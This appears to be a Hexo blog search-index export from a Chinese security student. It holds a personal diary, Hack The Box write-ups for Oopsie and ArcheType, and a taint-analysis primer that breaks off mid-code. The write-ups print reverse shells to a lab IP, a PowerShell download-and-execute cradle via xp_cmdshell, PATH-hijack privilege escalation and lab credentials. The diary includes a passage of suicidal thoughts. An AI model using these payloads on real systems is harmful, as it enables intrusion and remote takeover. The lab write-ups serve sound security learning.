<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Notebook</title>
      <link href="2049/09/01/Note/"/>
      <url>2049/09/01/Note/</url>
      
        <content type="html"><![CDATA[<h3 id="2021-04-28"><a href="#2021-04-28" class="headerlink" title="2021-04-28"></a>2021-04-28</h3><p>4月要过去了！</p><h3 id="2021-04-08"><a href="#2021-04-08" class="headerlink" title="2021-04-08"></a>2021-04-08</h3><p>最近又开始有点忧郁了，这是我的春天常见的吧。</p><h3 id="2021-02-25"><a href="#2021-02-25" class="headerlink" title="2021-02-25"></a>2021-02-25</h3><p>写在开学前：</p><p>不论未来如何，要快乐地活着！</p><h3 id="2020-12-13"><a href="#2020-12-13" class="headerlink" title="2020-12-13"></a>2020-12-13</h3><p>太菜了，太菜了，我要用尽全力学习了。</p><h3 id="2020-11-09"><a href="#2020-11-09" class="headerlink" title="2020-11-09"></a>2020-11-09</h3><p>感觉像是重新回到大一一样，开学不知道为了啥，一个劲儿的参加各种活动。到最后还是发现没有什么卵用，所以还是自己收敛一下自己的玩心，好好学习吧！</p><p>之前导师一直在叫我学习关于SQLite的一些漏洞挖掘的知识，让我去调试一些CVE漏洞，可是我发现调漏洞并不是那么理所当然的事，把关于漏洞的版本信息、补丁信息、PoC信息以及漏洞提交者所给出的触发流程等全都弄清楚了，也没法完全复现出漏洞的效果，也许我真的是太菜了。</p><p>所以导师应该看不下去了，让我跟着师姐做另外的协议漏洞挖掘了。</p><p>也参加了所里面的CTF月赛，不过课上的大作业和导师给的任务让我没有太多时间去学习。（其实是自己太贪玩了)下一次是14号，尽量把时间都腾出来参加吧。</p><h3 id="2020-09-20"><a href="#2020-09-20" class="headerlink" title="2020-09-20"></a>2020-09-20</h3><p>顺利度过了7、8月，顺利开学了。目前已经上了一周的课了。</p><h3 id="2020-06-17"><a href="#2020-06-17" class="headerlink" title="2020-06-17"></a>2020-06-17</h3><p>开始学习新东西，AFL，一个用于模糊测试的漏洞挖掘测试工具。</p><p>前几天参加了一个国外的CTF，NahamCon CTF，只做了几道热身题，就不想做了，后续看了看CTFtime上的wp，发现一个好玩的东西，The wayback machine，用于开源信息收集（OSINT）的，可以查看网站的归档和修改历史，尝试了一下自己以前的博客，幸好没有。</p><h3 id="2020-05-22"><a href="#2020-05-22" class="headerlink" title="2020-05-22"></a>2020-05-22</h3><p>终于在Windows上安装了python2的符号执行angr环境，得益于国外大佬的一个github项目：<a href="https://github.com/andreafioraldi/angr-win64-wheels%E3%80%82%E4%BD%86%E6%98%AF%E5%A5%BD%E5%83%8F%E9%87%8C%E9%9D%A2%E7%BC%BA%E4%BA%86%E4%B8%80%E4%B8%AAsimuvex%E7%9A%84whl%E6%96%87%E4%BB%B6%EF%BC%8C%E6%9C%89%E7%82%B9%E7%96%91%E9%97%AE%EF%BC%8C%E6%89%80%E4%BB%A5%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%8B%E7%BB%99%E5%A4%A7%E4%BD%AC%E5%8F%91%E4%BA%86%E4%B8%AAissue%EF%BC%8C%E6%9C%9F%E5%BE%85%E5%A4%A7%E4%BD%AC%E7%9A%84%E5%9B%9E%E5%A4%8D%E5%90%A7%E3%80%82">https://github.com/andreafioraldi/angr-win64-wheels。但是好像里面缺了一个simuvex的whl文件，有点疑问，所以在项目下给大佬发了个issue，期待大佬的回复吧。</a></p><h3 id="2020-05-20"><a href="#2020-05-20" class="headerlink" title="2020-05-20"></a>2020-05-20</h3><p>2020520，我在弄Windows上的远古angr环境，以期能够达成毕设的最优目标，现在看来是不可能的了。</p><h3 id="2020-04-08"><a href="#2020-04-08" class="headerlink" title="2020-04-08"></a>2020-04-08</h3><p>​        果然之前都是闲得慌却不想学习而自怨自艾出来的心理疾病，现在毕设迫在眉睫了，专心去做事了就不会胡思乱想了。</p><p>​        今天把之前的开题报告完善好了，也在知网上提交了，安排后面一个多星期的时间节点，初稿也快出来了吧（/憨笑）。学习？学习是不会上瘾的。也发现一个问题，就是做事需要有音乐陪伴，而且到了晚上尤其是凌晨0点到1点之间，才有动力去做，白日里就很慵懒的感觉，也不知道是不是所有毕业生都和我一样？（/再笑）。在此立下Flag，到4月20日时，一切都会如期进行。没有的话，我倒立拉shi。：）</p><p>​                                                                                                                            于 凌晨。</p><h3 id="2020-03-30"><a href="#2020-03-30" class="headerlink" title="2020-03-30"></a>2020-03-30</h3><p>决定迎接新生活，最近的悲观情绪确实有点多。似乎每年的春天都是这个样子，加上今年疫情的影响，再这样下去感觉要有严重的心理疾病了。所以在今天和过去做个了断吧。</p><p>今后的自己保持一个稳定的性格，不要那么多变！</p><blockquote><p>晚上睡觉的时候总想如果自己决定要suicide的话，要先和谁告别一下，结果想了很多，喜欢的人、亲人、挚友、导师，还有很多曾经以那么阳光的面孔对待我的人，我和这个世界还存在着很多的联系，也许等到哪一天这些联系都没有了的话，我也许就会很快决定了吧！</p></blockquote><h3 id="2020-03-11"><a href="#2020-03-11" class="headerlink" title="2020-03-11"></a>2020-03-11</h3><p>越来越觉得，和别人交流处于一种乏力的状态。</p><h3 id="2020-03-06"><a href="#2020-03-06" class="headerlink" title="2020-03-06"></a>2020-03-06</h3><p>Godaddy购买的域名过期了，42天之后才会真正取消，刚才重新布置了一下博客的配置，<code>busuanzi</code>统计的数据好像都丢失了。不过关系不大，只是为了好看而已。询问了同学是否要购买一个长期的自己的域名，最后决定自己不买了，后面自己做什么事也不知道，这个博客就先这样吧。听了学弟的一个讲座，觉得自己在网络上的习惯还是差太多了，不过话说OSINT的功能真强，网络果然不是法外之地。</p><p>我是个小菜鸡，嘤嘤嘤。</p><h3 id="2020-01-05"><a href="#2020-01-05" class="headerlink" title="2020-01-05"></a>2020-01-05</h3><p>心灵空虚的人似乎都会以另外一种方式来填充自己，无论是在自己的个人博客写自己的心灵独白，亦或是开一个公众号写自己在独自思考时产生的与平时格格不入的言语。</p><h3 id="2019-12-19"><a href="#2019-12-19" class="headerlink" title="2019-12-19"></a>2019-12-19</h3><p>上周和老师交流之后，这周的任务主要是去找机器学习的数据集，可是我发现好难找，也许我对数据集都还没有一个明确的定义。鹏哥也尝试帮我，最后也只得说上一句，”你再去调研调研吧！“。对鹏哥感动的一点是今天因为感冒请假了，他还问我周六团建去不去玩，我自觉不能再浪了，收收心好好做毕设了吧。</p><p>现在的想法，机器学习需要数据集，而在代码层面的数据集只是一个矩阵，一条条有了量化定义的数据吧，这和我之前所接触到的样本的定义是完全不同的啊。我应该需要自己想，混淆后的PE文件样本，有没有什么可以量化的特征可以提取出来的，通过提取特征量化后的数据来构建数据集，然后用来训练学习模型。我的输入既然是在IDA中的idb文件中，也许我该去仔细了解idb文件中都有哪些数据可以提取。网上开源的数据集我想我是没有指望了。</p><h3 id="2019-12-13"><a href="#2019-12-13" class="headerlink" title="2019-12-13"></a>2019-12-13</h3><p>会在微博发一些平时遇到的小知识点、小技巧之类的，所以昨天在<code>social links</code>把微博的链接也加上了。</p><p>上周和研究生导师电话交流了一下，建议我再看看我的这个毕设题目，毕竟我说的难点好像在她看来并不是难点，其实现在想来只是自己在之前没有理清思路而已，难点应该在如何结合到理论算法、以及特征识别上来。之前看过一部分论文，感觉讲得也不是太清楚。今晚回学校看看相关的论文，整理一下其他人的方法，然后明天再和老师联系一下。</p><p>其实最近的心情起伏很大，我想在别人面前表现的尽可能开朗一点，但其实最真实的是很多人都有自己的世界，想要别人懂你是一件很难的事。保持敬畏之心吧！</p><p>今天是国家公祭日，铭记历史，不忘耻辱！</p><h3 id="2019-12-06"><a href="#2019-12-06" class="headerlink" title="2019-12-06"></a>2019-12-06</h3><p>最近开始主动向部门经理要样本分析的任务，上周刚分析完5个类似的样本，都是同样的提取网络通信特征的任务，这周我再要的时候，一下子给我21个，难顶。我要个任务都这么卑微的吗？刚才突发奇想想换毕设的题目，就是打算跟着信工所那边的导师做项目，顺便当做毕设吧，明天和老师联系一下，看一下可行性。</p><p>这学期开学时报了学校“明远·启航”的声乐课，每周四都要去上课，老师教的练声很有用处。这周六有一个合唱演出，下周就结课了，想想还真挺快的。</p><h3 id="2019-11-25"><a href="#2019-11-25" class="headerlink" title="2019-11-25"></a>2019-11-25</h3><p>毕设开题报告已经展示过了，但是还是有很多的问题。不知是老师对相关领域的不熟悉，还是我自己的理解有问题，也许我需要做的还是有很多吧。决定这周熬夜做一个demo出来找老师看看。实在不行也可以按照老师给的想法，不局限于做IDA的插件，也许机器学习算法可以自己实现呢，不需要什么python的库呢。总之，自己加油，做出个样子吧。</p><h3 id="2019-11-23"><a href="#2019-11-23" class="headerlink" title="2019-11-23"></a>2019-11-23</h3><p>昨天和前天做完开题报告，今天回到公司上班了，经过开题报告，觉得这一段时间自己还是划水太多了。所以回到公司就想鹏哥问有没有样本可以分析。还是觉得按照自己学习爱看书的尿性，是真的很难进步，至少有样本在分析可以给自己一种紧迫感。</p><h3 id="2019-11-14"><a href="#2019-11-14" class="headerlink" title="2019-11-14"></a>2019-11-14</h3><p>10月底去了一趟西安，感触很多，不过越来越不想再出去玩了，一是资金，二是时间。自从上次分析完那批样本，部门经理似乎已经不管我这个打白工的实训生了，没有再给过我样本来分析，也好，自己看书也不错，但总是心里不踏实。</p><p>看《IDA Pro》了解了很多IDA使用的细节方面的东西，毕设是打算做一个IDA的反混淆插件，多珍惜时间吧。别人的时间不知为何就那么随意浪费，自己先珍惜好自己的时间吧。这个周末把开题报告写完吧，一直在犹豫要不要花钱买一个机器学习的在线课程来学一下，听了前面的一章的课，惊叹别人的逻辑时如此缜密。</p><p>最近发现看书看着看着会很困，所以就去刷看雪上和XCTF上的逆向题，也还好，还处于入门阶段，也一直想在先知投个稿试试，但是觉得自己解决的问题基本别人都有解答了的啊，苦恼，我想赚点钱啊！</p><h3 id="2019-10-17"><a href="#2019-10-17" class="headerlink" title="2019-10-17"></a>2019-10-17</h3><ol><li>这两天在公司没有样本分析，于是就看起了《IDA Pro》，慢慢看书梳理经历过的知识对我来说是一个很好的方法。</li><li>和同学约好周末一起去都江堰了。</li><li>认识的一个朋友又去深信服了，月薪10k+，3年后我会去哪里呢？</li></ol><h3 id="2019-10-13"><a href="#2019-10-13" class="headerlink" title="2019-10-13"></a>2019-10-13</h3><ol><li>这个星期在公司主要分析了宏病毒，使用VBE调试VB代码，很恶心的是居然使用宏代码进行注入，到最后也没能完全把注入的PE代码给提取出来，准备在自己的电脑上在试试吧。</li><li>毕设由于种种问题不能去研究所跟导师做了，现在很烦。</li><li>这个月的事不多，但都挺让人心烦意乱的了。</li></ol><h3 id="2019-10-07"><a href="#2019-10-07" class="headerlink" title="2019-10-07"></a>2019-10-07</h3><ol><li>这个新博客已经完善得差不多了，本来想加上评论系统的，但是一直出问题，而且发现评论系统的网站的访问速度有点慢，遂弃！</li><li>原来写过CSDN，也自己搭建过VPS上的blog，最终还是用这个吧，简单明了。</li><li>新的开始，保持记录吧！</li></ol><h3 id="2019-10-03"><a href="#2019-10-03" class="headerlink" title="2019-10-03"></a>2019-10-03</h3><ol><li>新建了依托于github的博客。</li><li>发现其实<code>hexo</code>挺强大的，后面也可以添加一些第三方服务，评论啊什么的，明天再弄吧！</li></ol><h3 id="2019-09-16"><a href="#2019-09-16" class="headerlink" title="2019-09-16"></a>2019-09-16</h3><ol><li>今天重新弄了一下这个博客，刚开始把什么开发过程全忘了，只能小心翼翼的在<code>Xshell</code>上弄，从删掉最丑的背景图开始，仔细检查服务器上的代码和本地的代码是否一致……</li><li>为了不让github提示我的代码有漏洞，决定将<code>Django</code>版本升级到<code>2.1.11</code>, 修改了<code>requirements.txt</code>中<code>django</code>对应的版本，使用<code>pip install -r requirements.txt</code>进行升级。</li><li>然后就遇到一个500(<code>Server error</code>)的<code>Bug</code>，经大佬们提醒，我暂时打开了<code>Debug</code>模式，仔细查看，才想起这是当初遇到的<code>Bug</code>,只要在<code>Python</code>的<code>base.py</code>中修改一下代码就可以了。</li><li>之后打算给小破站配个免费的<code>SSL</code>证书，然后鼓捣了一下午加一个晚上，服务器差点搞崩了，了解了<code>yum, python</code>之间的依赖关系，最后通过<code>Letsencrypt</code>的方法还是走不通，问了一下*哥，他说用<code>cloudfare+cdn</code>要好一点。</li><li>去查了一下这些个配置方法，好多，不想看，主要是思路和我这半天了解到的不太一样，没看懂。</li><li>回到搜索“最简单的免费配置<code>SSL</code>证书”上来，发现一个叫<code>Freessl</code>的网站，看他域名这么简单，应该也挺简单的吧！果然，证书生成、域名检测、部署配置一条龙打通，值得一提的是它的一键部署是将你本地生成的证书和私钥文件通过<code>SSH KEY</code>/服务器密码的方式直接传到你的服务器上，然后只需要在服务器上修改<code>nginx</code>配置，重启<code>nginx</code>就可以了。</li><li>最后，明天会有好事发生！Ebrn</li></ol><h3 id="2019-09-05"><a href="#2019-09-05" class="headerlink" title="2019-09-05"></a>2019-09-05</h3><ol><li>今天分析一个韩国的<code>hwp</code>样本，不知道自己为什么和喵喵比起来分析得那么慢，他说在网上搜索就直接有现成的分析报告，但是我的好像都没有，而且看日期还是前个星期才编译的呢。</li><li>样本属于宏病毒（实际上就是嵌套在文档中的脚本文件），<code>hwp</code>使用的是<code>PostScript</code>,早上看了其他类似的分析报告，了解了大致的分析思路，一整个下午就在调试，通过<code>OD</code>加载<code>hwp</code>的<code>gbb</code>可执行文件，来调试通过<code>hwpscan2</code>扫描出来的<code>ps</code>脚本，最后在内存中<code>Dump</code>出来了一个<code>PE</code>文件，用<code>ida</code>查看之后，发现是使用<code>Delphi</code>编译的<code>Dll</code>文件，和昨天分析那个一样，但是主要的功能和用<code>Systemtracer</code>监测到的不一样，估计还有其他的<code>PE</code>文件没有<code>dump</code>出来，或者<code>shellcode</code>。</li><li>越来越发现自己是一个赖不住寂寞的人，也才想着来自己的网站倾述自己一天的生活吧！</li></ol><h3 id="2019-09-03"><a href="#2019-09-03" class="headerlink" title="2019-09-03"></a>2019-09-03</h3><ol><li>今天分析一个<code>Delphi</code>编写的<code>Dll</code>，很多函数都是不能直接反编译的，开始了解花指令。</li><li>练习<code>PWN</code>，遇到整数溢出的题，属于上界溢出，由此可以利用栈溢出，很有意思，不过最后还是有点不太明白为什么要进入交互模式才能得到<code>flag</code>.</li><li>收集奖学金和保研的材料时，看着自己大三这一年的碌碌无为，参加了不少比赛，因为菜，而毫无作为！感到伤心。</li></ol><h3 id="2019-09-02"><a href="#2019-09-02" class="headerlink" title="2019-09-02"></a>2019-09-02</h3><ol><li>借鉴Sakura大佬的博客，我也写一个简短的生活记录吧！</li><li>暑假结束了，实习没有结束，一直在做病毒分析的工作，渐渐对二进制逆向和<code>pwn</code>产生了浓厚的兴趣。</li><li>保研虽然我们专业只有我和另外一位大佬竞争，按照往年的名额，感觉也可以，但我心里还是隐隐担心差那么一点点。</li><li>九推投了信工所，和之前联系的李*老师邮件交流，回复很快，挺开心。</li><li>校招投了奇安信，打算如果可以的话，之后自己去找实习吧。</li><li>在知乎上问了一个问题，得到了很多大佬的回答，感触良多，嗯，找准自己的方向，潜心修行吧！</li></ol>]]></content>
      
      
      <categories>
          
          <category> Thought </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Feelings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb:Oopsie</title>
      <link href="2021/04/21/htb-Oopsie/"/>
      <url>2021/04/21/htb-Oopsie/</url>
      
        <content type="html"><![CDATA[<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><p><code>nmap -sC -sV 10.10.10.28</code>: 得到开放端口22、80。搭建了一个http服务在80端口，浏览器查看，</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421142723931.png" alt="image-20210421142723931"></p><p>查看网页元素，发现有个<code>/cdn-cgi/login/</code>比较奇怪：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421142758084.png" alt="image-20210421142758084"></p><p>访问<code>http://10.10.10.28/cdn-cgi/login/</code>，是一个登录页面：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421142842221.png" alt="image-20210421142842221"></p><h3 id="2-切入"><a href="#2-切入" class="headerlink" title="2. 切入"></a>2. 切入</h3><p>使用上一台机器获得的管理员密码尝试：<code>admin/MEGACORP_4dm1n!!</code>，成功！</p><p>发先有个upload页面，但是提示需要super admin，当前是admin；发现Account页面显示了当前账户的ACCESS ID = 34322, 而请求头中的id=1：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421153539293.png" alt="image-20210421153539293"></p><p>爆破这个ID，从1-100，爆破时要选择这个重定向选项：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421153731920.png" alt="image-20210421153731920"></p><p>得到super admin的user为：86575; super admin</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421153847781.png" alt="image-20210421153847781"></p><h3 id="3-获取shell"><a href="#3-获取shell" class="headerlink" title="3. 获取shell"></a>3. 获取shell</h3><p>上传功能并没有做什么限制，直接就可以上传php，上传一个php-reverse-shell：</p><p>主要是bash-reverse-shell:<code>/bin/bash -c  &quot;bash -i &gt;&amp; dev.tcp/10.10.16.30/443 0&gt;&amp;1&quot;</code></p><p><img src="/2021/04/21/htb-Oopsie/image-20210421143011292.png" alt="image-20210421143011292"></p><p>本机监听443，执行<code>curl  http://10.10.10.28/uploads/shell.php</code>，得到www-data的一个shell，可以直接查看robert目录下的user.txt：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421143033802.png" alt="image-20210421143033802"></p><p>发现login目录下存在一个db.php，查看内容可以发现mysql的连接用户名和密码：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421145245678.png" alt="image-20210421145245678"></p><p>robert: M3g4C0rpUs3r!</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="4. 提权"></a>4. 提权</h3><p>用php反弹得到的shell无法切换用户，限制很多，本来以为没有办法了。</p><p>尝试用ssh连接，用上面的用户名密码登录，成功！</p><p><code>ssh robert@10.10.10.28 -p22</code></p><p>id命令查看当前用户，发现robert属于bugtracker这个组的。</p><p><code>find / -type f -group bugtracker 2&gt;/dev/null</code>用这个命令查看属于bugtracker组的文件:</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421152515975.png" alt="image-20210421152515975"></p><p>查看文件属性，发现只能root修改，bugtracker组的用户可以执行：</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421152443256.png" alt="image-20210421152443256"></p><p>执行查看效果，是根据ID来调用cat命令查看/root/reports/id下的文件，在Robert用户下尝试查看这个目录的内容发现权限被限制了，也就是在bugtracker中执行cat命令的权限是root级别的，可以通过这个来提权：</p><p>在tmp目录下创建一个cat文件，内容为”/bin/sh”，加上可执行权限，然后修改环境变量，用tmp下的cat覆盖/bin/cat。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">touch cat</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; cat</span><br><span class="line">chmod +x cat</span><br></pre></td></tr></table></figure><p>然后执行bugtracker，调用cat命令的时候就会去调用tmp目录下的cat，这样就获取到了root shell，然后在里面使用/bin/cat 查看root.txt的内容。</p><p><img src="/2021/04/21/htb-Oopsie/image-20210421151400819.png" alt="image-20210421151400819"></p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack the box </tag>
            
            <tag> burpsuite </tag>
            
            <tag> bruteforce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htb:ArcheType</title>
      <link href="2021/04/20/htb-ArcheType/"/>
      <url>2021/04/20/htb-ArcheType/</url>
      
        <content type="html"><![CDATA[<h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><p>现在好像不需要之前那样找js生成邀请码了，直接就可以注册账号了。注册完之后，需要配置openvpn来连接到它的实验室环境，选择好Machines之后，在右上角点击连接，会让你选择服务器的配置，然后有一个download vpn，点击它，会下载一个*username.ovpn文件，将这个文件复制到kali虚拟机中执行<code>openvpn *username.ovpn</code>就连接上了。在kali中另开一个terminal就可以ping通machine的IP了。</p><p>配置vpn的教程可以在官网查到：<a href="https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access">https://help.hackthebox.eu/getting-started/v2-introduction-to-vpn-access</a></p><h3 id="2-扫描"><a href="#2-扫描" class="headerlink" title="2. 扫描"></a>2. 扫描</h3><p>使用nmap扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d <span class="string">&#x27;/&#x27;</span> -f 1 | tr <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line">nmap -sC -sV -p<span class="variable">$ports</span> 10.10.10.27</span><br></pre></td></tr></table></figure><p>ports就是过滤出一个端口列表：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420200512579.png" alt="image-20210420200512579"></p><p>第二条命令就是去打印出更详细的信息，445和1433是需要关注的：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420200928189.png" alt="image-20210420200928189"></p><h3 id="3-smbclient"><a href="#3-smbclient" class="headerlink" title="3. smbclient"></a>3. smbclient</h3><p><code>smbclient -N -L \\\\10.10.10.27\\</code>:</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420201301027.png" alt="image-20210420201301027"></p><p>似乎有个backups可以查看内容。</p><p><code>smbclient -N \\\\10.10.10.27\\backups</code>:</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420201524934.png" alt="image-20210420201524934"></p><p>help指令可以查看可以使用命令。</p><p>使用dir命令查看一下文件内容，发现有个config文件，使用get命令下载该文件，打开查看，存在密码敏感信息：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420201908590.png" alt="image-20210420201908590"></p><p><img src="/2021/04/20/htb-ArcheType/image-20210420202155929.png" alt="image-20210420202155929"></p><p>userid: ARCHETYPE\sql_svc</p><p>password: M3g4c0rp123</p><h3 id="4-Impacket使用"><a href="#4-Impacket使用" class="headerlink" title="4. Impacket使用"></a>4. Impacket使用</h3><p>然后使用Impacket工具登录SQL账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz</span><br><span class="line">tar -xf impacket-0.9.21.tar.gz</span><br><span class="line"><span class="built_in">cd</span> impacet-0.9.21</span><br><span class="line">pip3 install .</span><br><span class="line">sudo python3 setup.py install</span><br><span class="line">sudo mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</span><br></pre></td></tr></table></figure><p><img src="/2021/04/20/htb-ArcheType/image-20210420204358674.png" alt="image-20210420204358674"></p><p><code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code>查看是否具有系统权限:</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420204642808.png" alt="image-20210420204642808"></p><p>执行以下命令创建反弹shell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;<span class="keyword">Show</span> <span class="keyword">Advanced</span> Options<span class="string">&#x27;, 1;</span></span><br><span class="line"><span class="string">reconfigure;</span></span><br><span class="line"><span class="string">sp_configure;</span></span><br><span class="line"><span class="string">EXEC sp_configure &#x27;</span>xp_cmdshell<span class="string">&#x27;, 1</span></span><br><span class="line"><span class="string">reconfigure;</span></span><br><span class="line"><span class="string">xp_cmdshell &quot;whoami&quot;</span></span><br><span class="line"><span class="string">xp_cmdshell &quot;powershell &quot;IEX (New-Object System.Net.WebClient).DownloadString(\&quot;http://10.10.16.30/shell.ps1\&quot;);&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>执行上面的命令前需要现在本机上搭建一个简单的服务器，在根目录下添加一个powershell的反弹shell的脚本<code>shell.ps1</code>：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.16.30&quot;</span>,<span class="number">443</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IP需要查看htb分配给自己的局域网IP，本来这里想用一下GitHub上的powercat的，但可能它限制了不能访问外网，所以不行。下面是powercat的使用方法：</p><p><code>powershell &quot;IEX (New-Object System.Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;); powercat -c 192.168.233.139 -p 9999 -e cmd&quot;</code></p><p>开启一个terminal执行<code>python3 -m http.server 80</code>，</p><p>开启另一个窗口执行<code>nc -lnvp 443</code>监听本地443端口，</p><p>设置防火墙规则：<code>ufw allow from 10.10.10.27 proto tcp to any port 80,443</code></p><p>执行完xp_cmdshell，最后在nc -lnvp 443的terminal窗口接收到反弹shell：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420220355325.png" alt="image-20210420220355325"></p><p>在Desktop目录下找到flag:</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420220532116.png" alt="image-20210420220532116"></p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5. 提权"></a>5. 提权</h3><p>查看Power Shell的历史命令，发现创建管理员账户的命令，也得知密码了<code>MEGACORP_4dm1n!!</code>:</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420221141504.png" alt="image-20210420221141504"></p><p>最后使用impacket的psexec.py 连接：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420221344686.png" alt="image-20210420221344686"></p><p>得到system权限shell：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420221408266.png" alt="image-20210420221408266"></p><p>进入Desktop目录，查看root.txt，得到flag：</p><p><img src="/2021/04/20/htb-ArcheType/image-20210420221709864.png" alt="image-20210420221709864"></p>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack the box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>污点分析</title>
      <link href="2021/04/07/%E6%B1%A1%E7%82%B9%E4%BC%A0%E6%92%AD%E5%88%86%E6%9E%90%E4%BB%8B%E7%BB%8D/"/>
      <url>2021/04/07/%E6%B1%A1%E7%82%B9%E4%BC%A0%E6%92%AD%E5%88%86%E6%9E%90%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h3><h4 id="1-1发展简史"><a href="#1-1发展简史" class="headerlink" title="1.1发展简史"></a>1.1发展简史</h4><ul><li>信息流分析方法：1976年，普渡大学D.E.Denning提出信息流的概念。通过向每一个数据对象“绑定”安全级别的方法，研究如何防止安全泄漏。</li><li>污点传播：在信息流基础上发展而来的一种跟踪数据在程序中处理逻辑的分析方法。根据不同的“绑定”机制，分为静态污点传播和动态污点传播。</li><li>静态污点传播方法：路径空间庞大，路径推演。</li><li>动态污点传播方法：<ul><li>动态插桩技术和工具：Valgrind、Pin、qemu…</li><li>TaintBochs</li><li>TaintCheck：恶意代码检测与防御。</li><li>TaintScope：软件漏洞分析与挖掘</li><li>TaintDroid：移动端。</li><li>TEMU：Dawn Song, <a href="http://bitblaze.cs.berkeley.edu/">http://bitblaze.cs.berkeley.edu/</a> </li></ul></li><li>污点传播的本质：数据流的跟踪。</li></ul><h3 id="2-基本原理介绍"><a href="#2-基本原理介绍" class="headerlink" title="2. 基本原理介绍"></a>2. 基本原理介绍</h3><ul><li><p>典型的污点传播过程演示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = get_input</span><br><span class="line">...</span><br><span class="line">y = x + 